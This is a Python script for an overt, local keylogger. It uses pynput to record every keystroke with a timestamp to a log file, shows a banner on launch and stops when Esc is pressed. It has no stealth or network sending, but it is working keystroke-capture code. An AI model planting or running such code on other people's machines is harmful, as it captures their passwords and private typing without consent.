import os
import datetime
import pyfiglet
from pynput import keyboard

class Keylogger:
    def __init__(self, log_file="logs.txt"):
        """
        Initialize the keylogger with a log file.
        :param log_file: File to save the logged keystrokes.
        """
        self.log_file = log_file
        self.log_buffer = []
        self.start_time = datetime.datetime.now()

        os.makedirs(os.path.dirname(log_file), exist_ok=True)

    def _append_to_log(self, content):
        """
        Append content to the in-memory log buffer.
        :param content: The keystroke or event data to log.
        """
        self.log_buffer.append(content)

    def _write_log_to_file(self):
        """
        Write the current log buffer to the specified log file.
        """
        try:
            with open(self.log_file, "a", encoding="utf-8") as file:
                file.write("".join(self.log_buffer))
            self.log_buffer.clear()
        except Exception as e:
            print(f"Error writing log: {e}")

    def _format_key(self, key):
        """
        Format the key for logging.
        :param key: The key event to format.
        :return: A formatted string representing the key.
        """
        try:
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            else:
                return f"[{key.name}]"
        except AttributeError:
            return f"[UNKNOWN_KEY]"

    def on_press(self, key):
        """
        Callback function for key press events.
        :param key: The key that was pressed.
        """
        formatted_key = self._format_key(key)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {formatted_key}\n"
        self._append_to_log(log_entry)

    def on_release(self, key):
        """
        Callback function for key release events.
        :param key: The key that was released.
        """
        if key == keyboard.Key.esc:
            self._write_log_to_file()
            print("Keylogger stopped by user. Logs saved.")
            return False

    def start(self):
        """
        Start the keylogger by listening for keyboard events.
        """
        print(f"Keylogger initiated at {self.start_time}. Press 'Esc' to terminate.")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        self._write_log_to_file()
        print("Keylogger session ended.")

if __name__ == "__main__":
    ascii_art = pyfiglet.figlet_format("KEYLOGGER")
    print(ascii_art)

    log_file_path = os.path.join(os.getcwd(), "keylogs", "session_log.txt")
    keylogger = Keylogger(log_file=log_file_path)
    keylogger.start()
